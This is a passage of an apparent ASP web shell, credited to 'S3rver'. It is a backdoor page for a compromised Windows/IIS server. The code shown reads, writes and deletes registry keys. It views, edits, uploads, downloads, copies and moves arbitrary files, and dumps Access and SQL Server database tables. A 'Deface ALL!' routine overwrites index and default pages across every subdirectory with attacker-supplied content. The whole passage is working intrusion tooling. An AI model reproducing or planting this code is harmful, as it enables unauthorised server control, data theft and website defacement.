					Response.Write "<table><tr><td><font face=""arial"" size=""1"">KEY: </td><td><input type=""text"" name=""key""> <font face=""arial"" size=""1""><br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">VALUE:</td><td><input type=""text"" name=""value""></td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">TYPE:</td><td><SELECT NAME=""type"">"
					Response.Write "<OPTION VALUE=""1"">REG_SZ </option>"
					Response.Write "<OPTION VALUE=""2"">REG_DWORD </option>"
					Response.Write "<OPTION VALUE=""3"">REG_BINARY </option>"
					Response.Write "<OPTION VALUE=""4"">REG_EXPAND_SZ </option>"
					Response.Write "<OPTION VALUE=""5"">REG_MULTI_SZ </option></select><br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""w"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes""></td></tr>"
					Response.Write "<tr><td></td><td><input type=""submit"" value=""OK""></form></td></tr></table>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">Main Menu</a><br>"
				End If
			Case "r"
				If Trim(Request.QueryString("process")) = "yes" Then
					Response.Write "<font face=""arial"" size=""2"">" & Trim(Request.QueryString("key")) & "<br>"
					Response.Write "Value: <b>" & WshShell.RegRead (Trim(Request.QueryString("key")))
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> <br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""r"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">Main Menu</a><br>"
			Case "d"
				If Trim(Request.QueryString("process")) = "yes" Then
					teste = WshShell.RegDelete (Trim(Request.QueryString("key")))
					Response.Write "Chave <b>" & Trim(Request.QueryString("key")) & " </b>Deleted."
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> ( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""d"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">Main Menu</a><br>"
			Case Else
				Response.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=w"">WRITE VALUE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=r"">READ VALUE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=d"">DELETE KEY</a><br>"
		End Select
		Set WshShell = Nothing
	Case "txtview"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp & "<font face=""arial"" size=""2"">"
		file = Replace(Trim(Request.QueryString("file")),"|","\")
		Set fso = CreateObject("Scripting.FileSystemObject")  
		Set a = fso.OpenTextFile(file)
		Response.Write Replace(Replace(Server.HTMLEncode(a.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
		Set a = Nothing
		Set fso = Nothing
	Case "txtedit"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Request.Form.Count = 0 Then
			file = Replace(Trim(Request.QueryString("file")),"|","\")
			Set fso = CreateObject("Scripting.FileSystemObject")
			Set a = fso.OpenTextFile(file)
			Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
			Response.Write "<textarea cols='85' rows='25' name=""content"" wrap=""physical"" >" & Server.HTMLEncode(a.ReadAll) & "</textarea><br>"
			Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("file")) & """>"
			Response.Write "<input type=""submit"" name=""savemethod"" value=""Save"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""submit"" name=""savemethod"" value=""Save as""></form>"
			Set a = Nothing
			Set fso = Nothing
		Else
			Select Case Trim(Request.Form("savemethod"))
				Case "Save"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					Set objstream = fso.OpenTextFile(Replace(Trim(Request.Form("path")),"|","\"),2)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "Texto salvo: <b>" & Replace(Trim(Request.Form("path")),"|","\") & "</b>"
				Case "Save as"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set objstream = fso.CreateTextFile(caminho,true,false)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
					Response.Write "<input type=""text"" name=""filename"" value=""" & showobj(Replace(Trim(Request.Form("path")),"|","\")) & """><br>"
					Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.Form("path")) & """>"
					Response.Write "<input type=""submit"" name=""savemethod2"" value=""Save""></form>"
				Case Else
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set ObjFSO = CreateObject("Scripting.FileSystemObject")
					Set MyFile = ObjFSO.GetFile(caminho)
					destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.Form("filename"))
					MyFile.Move (destino)
					If Err.Number = 0 Then
						Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & destino & "</b> salvo!"
						Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
					End If	
			End Select
		End If
	Case "download"
		Response.Buffer = True
		Response.Clear
		strFileName = Replace(Trim(Request.QueryString("file")),"|","\")
		strFile = Right(strFileName, Len(strFileName) - InStrRev(strFileName,"\"))
		strFileType = Request.QueryString("type")
		if strFileType = "" then strFileType = "application/download"
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		Set f = fso.GetFile(strFilename)
		intFilelength = f.size
		Set f = Nothing
		Set fso = Nothing
		Response.AddHeader "Content-Disposition", "attachment; filename=" & strFile
		Response.AddHeader "Content-Length", intFilelength
		Response.Charset = "UTF-8"
		Response.ContentType = strFileType
		Set Stream = Server.CreateObject("ADODB.Stream")
		Stream.Open
		Stream.type = 1
		Stream.LoadFromFile strFileName
		Response.BinaryWrite Stream.Read
		Response.Flush
		Stream.Close
		Set Stream = Nothing
	Case "upload"
		If Request.QueryString("processupload") <> "yes" Then
			Response.Write "<FORM METHOD=""POST"" ENCTYPE=""multipart/form-data"" ACTION=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&processupload=yes&path=" & Request.QueryString("path") & """>"
			Response.Write "<TABLE BORDER=0>"
			Response.Write "<tr><td><font face=""arial"" size=""2""><b>Select a file to upload:</b><br><INPUT TYPE=FILE SIZE=50 NAME=""FILE1""></td></tr>"
			Response.Write "<tr><td align=""center""><font face=""arial"" size=""2""><INPUT TYPE=SUBMIT VALUE=""Upload!""></td></tr>"
			Response.Write "</TABLE>"
		Else
			Set Uploader = New FileUploader
			Uploader.Upload()
			If Uploader.Files.Count = 0 Then
				Response.Write "File(s) not uploaded."
			Else
				For Each File In Uploader.Files.Items
					File.SaveToDisk Replace(Trim(Request.QueryString("path")),"|","\")
					Response.Write "File Uploaded: " & File.FileName & "<br>"
					Response.Write "Size: " & File.FileSize & " bytes<br>"
					Response.Write "Type: " & File.ContentType & "<br><br>"
					Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
				Next
			End If
		End If
	Case "mass"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Sub themassdeface(caminhodomass,metodo,ObjFSO,MeuArquivo)
			On Error Resume Next
			Set MonRep = ObjFSO.GetFolder(caminhodomass)
			Set ColFolders = MonRep.SubFolders
			for each folderItem in ColFolders
				destino1 = folderItem.path & "\index.htm"
				destino2 = folderItem.path & "\index.html"
				destino3 = folderItem.path & "\index.asp"
				destino4 = folderItem.path & "\index.cfm"
				destino5 = folderItem.path & "\index.php"
				destino6 = folderItem.path & "\default.htm"
				destino7 = folderItem.path & "\default.html"
				destino8 = folderItem.path & "\default.asp"
				destino9 = folderItem.path & "\default.cfm"
				destino10 = folderItem.path & "\default.php"
				MeuArquivo.Copy(destino1)
				MeuArquivo.Copy(destino2)
				MeuArquivo.Copy(destino3)
				MeuArquivo.Copy(destino4)
				MeuArquivo.Copy(destino5)
				MeuArquivo.Copy(destino6)
				MeuArquivo.Copy(destino7)
				MeuArquivo.Copy(destino8)
				MeuArquivo.Copy(destino9)
				MeuArquivo.Copy(destino10)
				Response.Write "<table><tr><td><font face='arial' size='2'>&lt;DIR&gt; " & folderItem.path & "</td>"
				If Err.Number = 0 Then
					Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>DONE!</font></td></tr>"
				Else
					Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr></table>"
				End If
				Err.Number = 0
				Response.Flush
				If metodo = "brute" Then
					Call themassdeface(folderItem.path & "\","brute",ObjFSO,MeuArquivo)
				End If
			next
		End Sub
		Sub brutemass(caminho,massaction)
			If massaction = "test" Then
				On Error Resume Next
				Set MonRep = ObjFSO.GetFolder(caminho)
				Set ColFolders = MonRep.SubFolders
				Set ColFiles0 = MonRep.Files
				for each folderItem in ColFolders
					Set TotalFolders = ObjFSO.GetFolder(folderItem.path)
					Set EachFolder = TotalFolders.SubFolders
					Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
					maindestino = folderItem.path & "\"
					MeuArquivo.Copy(maindestino)
					Response.Write "<tr><td><b><font face='arial' size='2'>&lt;DIR&gt; " & maindestino & "</b></td>"
					If Err.Number = 0 Then
						Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
					Else
						Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
					End If
					Err.Number = 0
					Response.Flush
					If EachFolder.count > 0 Then
						masscontador = 0
						for each subpasta in EachFolder
							masscontador = masscontador + 1
							destino = subpasta.path & "\"
							If masscontador = 1 Then
								destinofinal = destino
								pathfinal = subpasta.path
								Err.Number = 0
								MeuArquivo.Copy(destinofinal)
								Response.Write "<tr><td><font face='arial' size='2'>&lt;DIR&gt; " & showobj(pathfinal) & "</td>"
								If Err.Number = 0 Then
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
								Else
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
								End If
								Err.Number = 0
								Response.Flush
							Else
								MeuArquivo.Copy(destino)
								Response.Write "<tr><td><font face='arial' size='2'>&lt;DIR&gt; " & showobj(subpasta.path) & "</td>"
								If Err.Number = 0 Then
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
								Else
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
								End If
								Err.Number = 0
								Response.Flush
							End If
						next
						masscontador = 0
					End If
					Response.Write "</table><br>"
					Call brutemass(folderItem.path & "\","test")
				next
				Set MonRep = Nothing
				Set ColFolders = Nothing
				Set ColFiles0 = Nothing
			Else
				If Request.Form.Count = 0 Then
					Response.Write "<font face=""arial"" size=""2""><br><br><b>Brute:</b> Test and Deface root and sub directories.<br><br>"
					Response.Write "<b>Single:</b> Test and deface only root directories.<br><br>"
					Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc"">"
					Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>"
					Response.Write "<center><font face=""arial"" size=""2"">Deface Code:<br>"
					Response.Write "<textarea cols='65' rows='15' name=""content""></textarea><br>"
					Response.Write "<input type=""radio"" name=""massopt"" value=""brute"" checked>Brute&nbsp;&nbsp;&nbsp;"
					Response.Write "<input type=""radio"" name=""massopt"" value=""single"">Single<br>"
					Response.Write "<input type=""submit"" value=""Deface ALL!""></center>"
					Response.Write "</form>"
				Else
					Set ObjFSO = CreateObject("Scripting.FileSystemObject")
					patharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
					arquivomassdfc = patharquivotxt & "teste.txt"
					Set Arquivotxt = ObjFso.OpenTextFile(arquivomassdfc, 2, True, False)
					vetordelinhas = Split(Request.Form("content"),VbCrLf)
					For i = 0 To UBound(vetordelinhas)
						Arquivotxt.WriteLine(vetordelinhas(i))
					Next
					Set MeuArquivo = ObjFSO.GetFile(arquivomassdfc)
					
					If Request.Form("massopt") = "single" Then
						Call themassdeface(caminho,"single",ObjFSO,MeuArquivo)
					ElseIf Request.Form("massopt") = "brute" Then
						Call themassdeface(caminho,"brute",ObjFSO,MeuArquivo)
					End If
				End If
			End If
		End Sub
		If Trim(Request.QueryString("massact")) = "test" Then
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			patharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
			arquivo = patharquivotxt & "_vti_cnf.log"
			Set Arquivotxt = ObjFSO.CreateTextFile(arquivo,True)
			Set MeuArquivo = ObjFSO.GetFile(arquivo)
			Call brutemass(Replace(Trim(Request.QueryString("path")),"|","\"),"test")
		ElseIf Trim(Request.QueryString("massact")) = "dfc" Then
			Call brutemass(Replace(Trim(Request.Form("path")),"|","\"),"dfc")
		End If
	Case "fcopy"
            If Trim(Request.Form("submit1")) = "Copy" Then
		mptpath=Trim(Request.Form("path"))
		mptdest=Trim(Request.Form("cf"))
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		isl = ""
		if Trim(Request.Form("islem"))="kopyala" then
			objFSO.CopyFolder mptpath,mptdest
			isl="Copied.." 
		elseif Trim(Request.Form("islem"))="tasi" then
			objFSO.MoveFolder mptpath,mptdest
			isl="moved.." 
		end if

		response.Write "Command: "&isl
		response.Write "<br><font color=red>File From: </font>" & mptpath & "<br><font color=red>Copy to: </font>" & mptdest
		response.Write "<br>"
	    Else
		Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=fcopy"">"
		Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td width=100><font size=2>Copy Path : </td><td>"
		Response.Write "<input type=hidden value='19' name=status><input type=hidden value='"& Replace(Trim(Request.QueryString("path")),"|","\") &"' name=path><input type=hidden value='"&time&"' name=Time>"
		Response.Write "<input style='width:250; height:21' value='"& Replace(Trim(Request.QueryString("path")) & "\","|","\") &"' name=cf>"
		response.Write "<input type=submit value='Copy' style='height:22;width:70' id=submit1 name=submit1>"
		Response.Write "</td></tr><tr><td colspan=3 align=center><font size=2>"
		response.Write "<input type=radio name='islem' value='kopyala' checked>Copy"
		response.Write "<input type=radio name='islem' value='tasi'>Move"
		response.Write "</table>"
		response.Write "</form>"
	    End IF

	Case "filecopy"
            If Trim(Request.Form("submit1")) = "Copy" Then
		mptpath=Trim(Request.Form("path"))
		mptdest=Trim(Request.Form("cf"))
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		isl = ""
		if Trim(Request.Form("islem"))="kopyala" then
			objFSO.CopyFile mptpath,mptdest
			isl="Copy.." 
		elseif Trim(Request.Form("islem"))="tasi" then
			objFSO.MoveFile mptpath,mptdest
			isl="move.." 
		end if

		response.Write "Command: "&isl
		response.Write "<br><font color=red>File From: </font>" & mptpath & "<br><font color=red>Copy to: </font>" & mptdest
		response.Write "<br>"
	    Else
		Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=filecopy"">"
		Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td width=100><font size=2>Copy Path : </td><td>"
		Response.Write "<input type=hidden value='19' name=status><input type=hidden value='"& Replace(Trim(Request.QueryString("file")),"|","\") &"' name=path><input type=hidden value='"&time&"' name=Time>"
		Response.Write "<input style='width:250; height:21' value='"& Replace(Trim(Request.QueryString("file")),"|","\") &"' name=cf>"
		response.Write "<input type=submit value='Copy' style='height:22;width:70' id=submit1 name=submit1>"
		Response.Write "</td></tr><tr><td colspan=3 align=center><font size=2>"
		response.Write "<input type=radio name='islem' value='kopyala' checked>Copy"
		response.Write "<input type=radio name='islem' value='tasi'>Move"
		response.Write "</table>"
		response.Write "</form>"
	    End IF


	Case "search"
         If (Trim(Request.Form("submit1")) = "Search") xor Trim(Request.QueryString("status"))<>"" Then
          showdisks=FALSE
 	  status5=Trim(Request.Form("status"))
	  if status5="" then status5=Trim(Request.QueryString("status"))
 	      SELECT CASE status5

		CASE "5"
			Response.Write "<center><b><font color=orange>"& Trim(Request.QueryString("path")) &"</font></b></center><br>"
			Response.Write "<table width=100% ><tr><td>"
			set f = objFSO.OpenTextFile(Trim(Request.QueryString("path")),1)
			Response.Write "<pre>"&Server.HTMLEncode(f.readAll)&"</pre>"
			if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunam?yor\nSistem dosyas?olabilir')</script>":Response.End



	  	 CASE "7":
			Response.Write "<b><font size=3>Tables</font></br><br>"
			Set objConn = Server.CreateObject("ADODB.Connection")
			Set objADOX = Server.CreateObject("ADOX.Catalog")
			objConn.Provider = "Microsoft.Jet.Oledb.4.0"
			objConn.ConnectionString = Trim(Request.QueryString("path"))
			objConn.Open
			objADOX.ActiveConnection = objConn

			For Each table in objADOX.Tables
				If table.Type = "TABLE" Then
					Response.Write "<font face=wingdings size=5>4</font> <a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=search&status=8&Path="& Trim(Request.QueryString("path")) &"&table="&table.Name&"'>"&table.Name&"</a><br>"
				End If
			Next

		CASE "8":
			table=Trim(Request.QueryString("table"))
			Response.Write "<font color=red><h4>Table Name: " & table & "</h4></font><br><Br><br>"
			Set objConn = Server.CreateObject("ADODB.Connection")
			Set objRcs = Server.CreateObject("ADODB.RecordSet")
			objConn.Provider = "Microsoft.Jet.Oledb.4.0"
			objConn.ConnectionString = Trim(Request.QueryString("path"))
			objConn.Open
			objRcs.Open table,objConn, adOpenKeyset , , adCmdText
	
			Response.Write "<table border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
				Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
				Response.Write "<tr>"
				for i=0 to objRcs.Fields.count-1
					Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
				next
				Response.Write "</tr>"
				objRcs.MoveNext
			loop
			Response.Write "</table><br>"


		 case "12": araBul Trim(Request.Form("path")),Trim(Request.Form("arama"))

		END SELECT

	 Else
		showdisks=FALSE
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write "<form method=""post"" target=""_opener"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=search"">"
		Response.Write "<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>File Ext: </td><td>"
		Response.Write "&nbsp;<input type=hidden value='12' name=status>"
		Response.Write "<input type=hidden value=""" & Replace(Trim(Request.QueryString("path")),"|","\") & """ name=""path""><input style='width:250' value='mdb' name='arama'><input style='width:70; height:22' type=submit value='Search' name='submit1'>"
		Response.Write "</td></tr></table></form>"
	End IF



	Case "sqlserver"
         If (Trim(Request.Form("submit1")) = "Execute SQL Server Command") xor Trim(Request.QueryString("status"))<>"" Then
          showdisks=FALSE
 	  status5=Trim(Request.Form("status"))
	  if status5="" then status5=Trim(Request.QueryString("status"))
 	      SELECT CASE status5


	  	 CASE "7":
			Response.Write "<b><font size=3>Tables</font></br><br>"
			Set objConn = Server.CreateObject("ADODB.Connection")
			Set objADOX = Server.CreateObject("ADOX.Catalog")
			objConn.Provider = "Microsoft.Jet.Oledb.4.0"
			objConn.ConnectionString = Trim(Request.QueryString("path"))
			objConn.Open
			objADOX.ActiveConnection = objConn

			For Each table in objADOX.Tables
				If table.Type = "TABLE" Then
					Response.Write "<font face=wingdings size=5>4</font> <a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=search&status=8&Path="& Trim(Request.QueryString("path")) &"&table="&table.Name&"'>"&table.Name&"</a><br>"
				End If
			Next

		CASE "8":
			table=Trim(Request.QueryString("table"))
			Response.Write "<font color=red><h4>Table Name: " & table & "</h4></font><br><Br><br>"
			Set objConn = Server.CreateObject("ADODB.Connection")
			Set objRcs = Server.CreateObject("ADODB.RecordSet")
			objConn.Provider = "Microsoft.Jet.Oledb.4.0"
			objConn.ConnectionString = Trim(Request.QueryString("path"))
			objConn.Open
			objRcs.Open table,objConn, adOpenKeyset , , adCmdText
	
			Response.Write "<table border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
				Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
				Response.Write "<tr>"
				for i=0 to objRcs.Fields.count-1
					Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
				next
				Response.Write "</tr>"
				objRcs.MoveNext
			loop
			Response.Write "</table><br>"


	      END SELECT

	 Else
		showdisks=FALSE
		checa = checking(cprthtml,keydec)
		Call hdr()

		Response.Write "<form method=""post"" target=""_opener"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=sqlserver"">"
		Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server connection string:</td></tr><tr><td align=center>"
		Response.Write "<input type=hidden value='7' name=status>"
		Response.Write "<input style='width:250; height:21' value='' name=path><br>"
		response.Write "<input type=submit value='Execute SQL Server Command' style='height:23;width:220' id=submit1 name=submit1>"
		Response.Write "</td></tr></table>"
		response.Write "</form>"

	End IF



	Case "about"
		showdisks=FALSE
		checa = checking(cprthtml,keydec)
		Call hdr()
		response.Write "<br><br><br><body topmargin=5 leftmargin=0><center><h4>Coded By S3rver"
		response.Write "<br><br>"
		response.Write "<font size=2 color=Red face='courier new'>WebSite: :)</font>"
		response.Write "<br>"
		response.Write "<font size=2 color=Red face='courier new'>E-Mail: Pouya.S3rver@Gmail.Com</font>"
		response.Write "<br><br>"
		response.Write "<font size=2 color=Blue face='courier new'>Hackers, Crackers, Programmers Forever!</font>"


	Case Else
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Call showcontent()
End Select
If Err.Number <> 0 Then
	Response.Write "<br><font face='arial' size='2'>ERRO: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Acesse denied."
End If
Response.Write endcode

if showdisks then

%>

	<script language=javascript>
		// DRIVE ISLEMLERI
		function driveGo(drive_){
			location = "?raiz="+drive_+":";
		}
	</script>


<%


	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")

	Response.Write "<br><br><br><table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>Drives</td></tr>"
	for each drive_ in objFSO.Drives
		Response.Write "<tr><td>"
		Response.write "<a href='#'onClick=""driveGo('" & drive_.DriveLetter & "');return false;""><font face=wingdings>;</font>"
		if drive_.Drivetype=1 then Response.write "Floppy [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=2 then Response.write "HardDisk [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=3 then Response.write "Remote HDD [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=4 then Response.write "CD-Rom [" & drive_.DriveLetter & ":]"
		Response.Write "</a></td></tr>"
	next
	Response.Write "<tr><td>"
	Response.write "<a href='"& Request.ServerVariables("SCRIPT_NAME") & "'><font face=webdings>H</font> Local Path"
	Response.Write "</a></td></tr>"
	Response.Write "</table><br>"
end if
%>
<br><Center><Font Face='Wingdings' Size='7' Color = 'FFFFFF'><b> µ </b></Font></Center>
<br><Center><Font Face='Wingdings' Size='7' Color = 'FFFFFF'><b> µ </b></Font></Center>
<br><Center><Font Face='Wingdings' Size='7' Color = 'FFFFFF'><b> µ </b></Font></Center>
<br><Center><Font Face='Wingdings' Size='7' Color = 'FFFFFF'><b> µ </b></Font></Center>